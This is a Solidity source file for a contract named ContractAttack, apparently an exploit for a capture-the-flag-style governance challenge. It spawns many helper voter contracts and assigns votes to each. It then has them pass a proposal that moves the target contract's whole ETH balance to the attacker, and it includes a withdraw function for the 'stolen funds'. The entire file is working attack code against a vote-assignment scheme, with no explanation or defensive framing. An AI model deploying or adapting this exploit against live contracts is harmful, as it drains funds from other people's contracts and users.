// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

interface IAssignVotes {
    function createProposal(address target, bytes calldata data, uint256 value) external;
    function removeAssignment(address _voter) external;
    function assign(address _voter) external;
    function vote(uint256 proposal) external;
    function execute(uint256 proposal) external;
}

contract ContractAttack {
    IAssignVotes public target;
    address[] public voters;
    uint256 public proposalId;
    
    constructor(address _target) {
        target = IAssignVotes(_target);
    }
    
    // Helper function to create voter contracts
    function createVoters(uint256 count) external {
        for(uint256 i = 0; i < count; i++) {
            VoterContract voter = new VoterContract(address(target));
            voters.push(address(voter));
        }
    }
    
    // Step 1: Create malicious proposal
    function createMaliciousProposal() external {
        // Create proposal to drain the contract
        bytes memory drainCall = abi.encodeWithSignature("transfer(address)", address(this));
        target.createProposal(
            address(this),  // target is this contract
            drainCall,      // call data to drain
            address(target).balance  // drain all balance
        );
        
        proposalId = 0;  // First proposal
    }
    
    // Step 2: Exploit the voting system
    function executeAttack() external {
        // First assign votes to all our voter contracts
        for(uint256 i = 0; i < voters.length; i++) {
            target.assign(voters[i]);
        }
        
        // Now make all voters vote
        for(uint256 i = 0; i < voters.length; i++) {
            VoterContract(voters[i]).castVote(proposalId);
        }
        
        // Execute the proposal
        target.execute(proposalId);
    }
    
    // Function to receive ETH when the malicious proposal executes
    receive() external payable {}
    
    // Withdraw stolen funds
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// Helper contract to act as a voter
contract VoterContract {
    IAssignVotes public target;
    
    constructor(address _target) {
        target = IAssignVotes(_target);
    }
    
    function castVote(uint256 proposalId) external {
        target.vote(proposalId);
    }
}